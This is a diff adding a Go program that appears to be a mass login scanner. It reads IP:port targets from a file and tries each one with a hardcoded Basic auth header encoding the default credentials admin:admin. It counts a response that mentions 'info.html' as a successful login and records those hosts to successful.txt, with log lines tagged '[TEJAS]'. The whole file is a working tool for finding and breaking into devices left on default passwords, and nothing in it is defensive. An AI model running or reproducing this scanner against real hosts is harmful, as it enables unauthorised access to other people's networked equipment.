@@ -1,0 +1,100 @@
+package main
+
+import (
+    "bufio"
+    "fmt"
+    "io/ioutil"
+    "net/http"
+    "os"
+    "strings"
+    "time"
+    "net"
+)
+
+func main() {
+    // Open the "ips.txt" file
+    file, err := os.Open("ips.txt")
+    if err != nil {
+        fmt.Println("Error opening ips.txt:", err)
+        return
+    }
+    defer file.Close()
+
+    // Create a scanner to read lines from the file
+    scanner := bufio.NewScanner(file)
+
+    // Create a file to write successful logins
+    successfulFile, err := os.Create("successful.txt")
+    if err != nil {
+      //  fmt.Println("Error creating successful.txt:", err)
+        return
+    }
+    defer successfulFile.Close()
+
+    // Iterate through each line in the file
+    for scanner.Scan() {
+        // Read the IP and port from the current line
+        ipPort := strings.TrimSpace(scanner.Text())
+
+        // Create a URL using the IP and port
+        url := "http://" + ipPort + "/"
+
+        // Create a new HTTP request
+        req, err := http.NewRequest("GET", url, nil)
+        if err != nil {
+        //    fmt.Println("Error creating request:", err)
+            continue
+        }
+
+        // Set request headers (same as before)
+        req.Header.Set("Host", ipPort)
+        req.Header.Set("Cache-Control", "max-age=0")
+        req.Header.Set("Authorization", "Basic YWRtaW46YWRtaW4=")
+        req.Header.Set("Upgrade-Insecure-Requests", "1")
+        req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36")
+        req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+        req.Header.Set("Accept-Encoding", "gzip, deflate")
+        req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+        req.Header.Set("Connection", "close")
+
+        // Create an HTTP client with a timeout
+        client := &http.Client{
+            Timeout: 6 * time.Second, // Adjust the timeout as needed (e.g., 10 seconds)
+        }
+
+        // Send the request and handle timeouts
+        resp, err := client.Do(req)
+        if err != nil {
+            if err, ok := err.(net.Error); ok && err.Timeout() {
+                // Handle timeouts as needed
+              //  fmt.Println("Request timed out for", ipPort)
+                continue
+            }
+            // Handle other request-related errors as needed
+           // fmt.Println("Error sending request for", ipPort, ":", err)
+            continue
+        }
+        defer resp.Body.Close()
+
+        // Read and analyze the response body
+        responseBody, err := ioutil.ReadAll(resp.Body)
+        if err != nil {
+            fmt.Println("Error reading response body for", ipPort, ":", err)
+            continue
+        }
+
+        // Check if the response body contains "info.html"
+        if strings.Contains(string(responseBody), "info.html") {
+            fmt.Println("[TEJAS] login successful for:", ipPort)
+            // Write the successful login entry to the file
+            successfulFile.WriteString("" + ipPort + "\n")
+        } else {
+            fmt.Println("[TEJAS] Login failed for", ipPort)
+        }
+    }
+
+    // Check for errors while scanning the file
+    if err := scanner.Err(); err != nil {
+        fmt.Println("Error reading ips.txt:", err)
+    }
+}
